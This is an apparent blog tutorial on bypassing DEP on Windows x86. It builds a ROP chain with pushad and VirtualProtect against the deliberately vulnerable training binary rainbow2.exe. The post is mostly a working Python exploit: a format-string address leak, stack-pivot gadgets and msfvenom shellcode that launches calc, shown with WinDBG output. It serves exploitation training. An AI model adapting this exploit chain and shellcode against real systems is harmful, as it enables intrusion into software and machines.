---
categories:
- Windows Userland Exploitation
image:
  path: proof.png
layout: post
media_subpath: /assets/posts/2022-06-14-bypassing-dep-with-virtualalloc-x86
tags:
- binary exploitation
- windows
title: Bypassing DEP with VirtualProtect (x86)
---

In the last post we explored how to exploit the rainbow2.exe binary from the [vulnbins](https://github.com/xct/vulnbins) repository using WriteProcessMemory & the "skeleton" method. Now we are going to explore how to use VirtualProtect and instead of setting up the arguments on the stack with dummy values and then replacing them, we are going to use the `pushad` instruction to push alle registers on the stack & then execute our function.

We start from the following exploit template:

```python
#!/usr/bin/env python3
from pwn import *

offset = 1032
size = 4000

p = remote('192.168.153.212',2121, typ='tcp', level='debug')
p.sendline(b"LST |%p|%p|%p|%p|")
leak = p.recvline(keepends=False).split(b"|")[1:]
binary_leak = int(leak[1].decode(),16)
binary_base = binary_leak - 0x14120;
log.info("Binary base: "+hex(binary_base))

rop_gadgets = [
      0xdeadc0de,
]

rop = b""
rop += p32(binary_base + 0x159d)*(32) # ropnop
for g in rop_gadgets:
      rop += p32(g)

log.info("Sending payload..")
buf  = b""
buf += b"LST "
buf += rop
buf += b"A" * (offset-len(rop))
buf += b"B" * 4 
buf += p32(binary_base + 0x11396)
buf += b"D" * (size-len(buf))
p.sendline(buf)
input("Press enter to continue..")
p.close() 
```

```
0:003> `p
deadc0de ??              ???
```

As before, we are going to use a stack pivot to land in our input buffer and execute a rop chain which just consists of a dummy instruction at this point. Let’s explore how pushad works: Pushes the following registers in the following order onto the stack: `EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI` ([https://c9x.me/x86/html/file\_module\_x86\_id\_270.html](https://c9x.me/x86/html/file_module_x86_id_270.html)) .

We also need to know what arguments [VirtualProtect](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) expects:

```cpp
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```

The first argument **lpAddress** is the address at which we want to change memory protections, **dwSize** is giving the size, **flNewProtect** is a mask for the new protections we want (0x40 = PAGE\_EXECUTE\_READWRITE) and **lpflOldProtect** must be a writeable address so the old protections can be stored. If we look at the order pushad places the values on the stack, we should setup the registers as follows (which will end up on the stack exactly in the order below but in reverse, e.g. ropnop being the first gadget):

```
# Registers
EAX 90909090  => Shellcode                                               
ECX &writable => lpflOldProtect                                
EDX 00000040  => flNewProtect                                   
EBX 00000501  => dwSize                                           
ESP ????????  => lpAddress (ESP)                         
EBP ????????  => Redirect control fow to ESP              
ESI ????????  => &VirtualProtect
EDI ????????  => RopNop
```

Setting those registers up correctly requires some planning – as soon as you are done setting up one of them you can not use it anymore to setup the other registers. That’s why we have to setup the more commonly used registers at the end.

We start by setting up ebx. Note that in order to get 0x501 into the register without having null bytes we could use a `add, DWORD` instruction and calculate the difference. In this case there is `add eax,5D40C033;`. If we calculate ``? 0x501 - 0x5d40c033 = a2bf44ce`` we get the value we have to put into that register to end up with the value we want.

```
# EBX
# Blocked: None
0x4CBFB + binary_base,  # pop eax; ret;
0xa2bf44ce,             # put delta into eax (goal: 0x00000201 into ebx)
0x7720E + binary_base,  # add eax,5D40C033; ret;
0x3AE24 + binary_base,  # xchg eax, ebx; ret;
```

Now we setup edx. We use the same trick again to get the null byte free value of 0x40 into the register.

```
# EDX
# Blocked: EBX
0x4CBD7 + binary_base,  # pop eax; ret;
0xa2a7fdd6,             # put delta into eax (goal: 0x00000040 into edx)
0x76EFF + binary_base,  # add eax, 0x5D58026A       
0x1ABA5 + binary_base,  # xchg eax, edx; dec eax; add al, byte ptr [eax]; pop ecx; ret;
0x41414141,             # dummy
```

We continue by setting ecx. Since this needs a writable address we get one via WinDBG as described in the other post and just pop the value into the register.

```
# ECX
# Blocked: EBX, EDX
0x72D31 + binary_base,  # pop ecx; ret;
0xA635A + binary_base,  # &writable location
```

For edi, we set the address of a ropnop gadget directly via pop:

```
# EDI
# Blocked: EBX, EDX, ECX
0x32301 + binary_base,  # pop edi; ret;
0x774C7 + binary_base,  # ropnop
```

We set esi by popping the address of a jmp eax gadget. Normally this would hold the address of VirtualProtect but we will store VirtualProtect at the very end in eax – so placing jmp eax here will achieve the same.

```
# ESI
# Blocked EBX, EDX, ECX, EDI
0x24261 + binary_base,  # pop esi; ret;      
0x14AF9 + binary_base,  # jmp eax (just stored, not executed right away)
```

Finally we set up eax with the address of VirtualProtect. This is a bit tricky because we do not have a leak in kernel32 and the binary does not use VirtualProtect itself. We can however just as in the other post get the address of another kernel32 function from the IAT and then subtract the offset.

```
0:001> ?kernel32!WriteFile - kernel32!VirtualProtectStub
Evaluate expression: 12528 = 000030f0
```

```
# EAX
# Blocked EBX, EDX, ECX, EDI, ESI
0x704F4 + binary_base,  # pop eax; ret;
0x9015C + binary_base,  # IAT WriteFile
0x2BB8E + binary_base,  # mov eax, dword ptr [eax] / dereference IAT to get kernel32 ptr
0x113AB + binary_base,  # sub eax,1000 
0x113AB + binary_base,  # sub eax,1000 
0x113AB + binary_base,  # sub eax,1000 
0x4d1ed + binary_base,  # sub eax, 0x30 ; pop ebp ; ret;
0x41414141,
0x4d1ed + binary_base,  # sub eax, 0x30 ; pop ebp ; ret;
0x41414141,
0x4d1ed + binary_base,  # sub eax, 0x30 ; pop ebp ; ret;
0x41414141,
0x4d1ed + binary_base,  # sub eax, 0x30 ; pop ebp ; ret;
0x41414141,
0x4d1ed + binary_base,  # sub eax, 0x30 ; pop ebp ; ret;
0x7D695 + binary_base,  # pop ebp dummy 

0x752EC + binary_base,  # pushad
0x11394 + binary_base,  # jmp esp
```

At this point we can call the pushad instruction to put everything on the stack which then looks as follows:

```
0x752EC + binary_base,  # pushad
0x11394 + binary_base,  # jmp esp
```

```
eax=76c304c0 ebx=00000501 ecx=3fb5635a edx=00000040 esi=3fac4af9 edi=3fb274c7
eip=3fb252ec esp=0151f790 ebp=3fb2d695

0:003> dd /c1 esp
0151f790  3fb274c7 # ropnop
0151f794  3fac4af9 # jmp eax (eax=&VirtualProtect)
0151f798  3fb2d695 # pop ebp (pops 76c304c0)
0151f79c  0151f7b0 # ptr sc  ----
0151f7a0  00000501               |
0151f7a4  00000040               |
0151f7a8  3fb5635a               |
0151f7ac  76c304c0               |
0151f7b0  3fac1394 # jmp esp     |
0151f7b4  90909090  <------------
...
```

At this point we can execute our shellcode and get our calc. The full exploit can be found below:

```python
#!/usr/bin/env python3
from pwn import *

offset = 1032
size = 4000

sc =  b""
sc += b"\x90"*0x10
# msfvenom -p windows/exec CMD="calc.exe" -a x86 -f python -v sc -b '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x20\x2f\x5C'
sc += b"\x29\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
sc += b"\x76\x0e\xad\x9c\x2a\x96\x83\xee\xfc\xe2\xf4\x51\x74"
sc += b"\xa8\x96\xad\x9c\x4a\x1f\x48\xad\xea\xf2\x26\xcc\x1a"
sc += b"\x1d\xff\x90\xa1\xc4\xb9\x17\x58\xbe\xa2\x2b\x60\xb0"
sc += b"\x9c\x63\x86\xaa\xcc\xe0\x28\xba\x8d\x5d\xe5\x9b\xac"
sc += b"\x5b\xc8\x64\xff\xcb\xa1\xc4\xbd\x17\x60\xaa\x26\xd0"
sc += b"\x3b\xee\x4e\xd4\x2b\x47\xfc\x17\x73\xb6\xac\x4f\xa1"
sc += b"\xdf\xb5\x7f\x10\xdf\x26\xa8\xa1\x97\x7b\xad\xd5\x3a"
sc += b"\x6c\x53\x27\x97\x6a\xa4\xca\xe3\x5b\x9f\x57\x6e\x96"
sc += b"\xe1\x0e\xe3\x49\xc4\xa1\xce\x89\x9d\xf9\xf0\x26\x90"
sc += b"\x61\x1d\xf5\x80\x2b\x45\x26\x98\xa1\x97\x7d\x15\x6e"
sc += b"\xb2\x89\xc7\x71\xf7\xf4\xc6\x7b\x69\x4d\xc3\x75\xcc"
sc += b"\x26\x8e\xc1\x1b\xf0\xf6\x2b\x1b\x28\x2e\x2a\x96\xad"
sc += b"\xcc\x42\xa7\x26\xf3\xad\x69\x78\x27\xda\x23\x0f\xca"
sc += b"\x42\x30\x38\x21\xb7\x69\x78\xa0\x2c\xea\xa7\x1c\xd1"
sc += b"\x76\xd8\x99\x91\xd1\xbe\xee\x45\xfc\xad\xcf\xd5\x43"
sc += b"\xce\xfd\x46\xf5\x83\xf9\x52\xf3\xad\x9c\x2a\x96"

p = remote('192.168.153.212',2121, typ='tcp', level='debug')
p.sendline(b"LST |%p|%p|%p|%p|")
leak = p.recvline(keepends=False).split(b"|")[1:]
binary_leak = int(leak[1].decode(),16)
binary_base = binary_leak - 0x14120;
log.info("Binary base: "+hex(binary_base))

rop_gadgets = [
      # EBX
      # Blocked: None
      0x4CBFB + binary_base,  # pop eax; ret;
      0xa2bf44ce,             # put delta into eax (goal: 0x00000501 into ebx)
      0x7720E + binary_base,  # add eax,5D40C033; ret;
      0x3AE24 + binary_base,  # xchg eax, ebx; ret;

      # EDX
      # Blocked: EBX
      0x4CBD7 + binary_base,  # pop eax; ret;
      0xa2a7fdd6,             # put delta into eax (goal: 0x00000040 into edx)
      0x76EFF + binary_base,  # add eax, 0x5D58026A       
      0x1ABA5 + binary_base,  # xchg eax, edx; dec eax; add al, byte ptr [eax]; pop ecx; ret;
      0x41414141,             # dummy

      # ECX
      # Blocked: EBX, EDX
      0x72D31 + binary_base,  # pop ecx; ret;
      0xA635A + binary_base,  # &writable location

      # EDI
      # Blocked: EBX, EDX, ECX
      0x32301 + binary_base,  # pop edi; ret;
      0x774C7 + binary_base,  # ropnop

      # ESI
      # Blocked EBX, EDX, ECX, EDI
      0x24261 + binary_base,  # pop esi; ret;      
      0x14AF9 + binary_base,  # jmp eax (just stored, not executed)

      # EAX
      # Blocked EBX, EDX, ECX, EDI, ESI
      0x704F4 + binary_base,  # pop eax; ret;
      0x9015C + binary_base,  # IAT WriteFile
      0x2BB8E + binary_base,  # mov eax, dword ptr [eax] / dereference IAT to get kernel32 ptr
      0x113AB + binary_base,  # sub eax,1000 
      0x113AB + binary_base,  # sub eax,1000 
      0x113AB + binary_base,  # sub eax,1000 
      0x4d1ed + binary_base,  # sub eax, 0x30 ; pop ebp ; ret;
      0x41414141,
      0x4d1ed + binary_base,  # sub eax, 0x30 ; pop ebp ; ret;
      0x41414141,
      0x4d1ed + binary_base,  # sub eax, 0x30 ; pop ebp ; ret;
      0x41414141,
      0x4d1ed + binary_base,  # sub eax, 0x30 ; pop ebp ; ret;
      0x41414141,
      0x4d1ed + binary_base,  # sub eax, 0x30 ; pop ebp ; ret;
      0x7D695 + binary_base,  # pop ebp dummy 

      0x752EC + binary_base,  # pushad
      0x11394 + binary_base,  # jmp esp
]

rop = b""
rop += p32(binary_base + 0x159d)*(32) # ropnop
for g in rop_gadgets:
      rop += p32(g)

log.info("Sending payload..")
buf  = b""
buf += b"LST "
buf += rop
buf += sc
buf += b"A" * (offset-len(rop)-len(sc))
buf += b"B" * 4 
buf += p32(binary_base + 0x11396)
buf += b"D" * (size-len(buf))
p.sendline(buf)
input("Press enter to continue..")
p.close() 
```